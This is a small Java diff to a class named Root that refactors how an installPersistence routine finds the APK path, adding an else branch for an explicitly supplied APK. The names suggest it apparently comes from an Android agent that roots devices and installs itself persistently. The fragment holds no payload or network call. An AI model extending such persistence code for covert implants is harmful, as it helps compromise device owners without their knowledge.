@@ -485,15 +485,17 @@ public class Root {
 
 		Boolean isPersistent = false;
 
-		String apkPosition = null;
+		String apkPosition = Status.getApkName();
 		if(apk == null) {
-			if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
+			if (apkPosition != null && !Status.isMelt()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
 				}
 			} else {
 				return false;
 			}
+		}else{
+			apkPosition = apk;
 		}
 
 		isPersistent = Status.isPersistent();
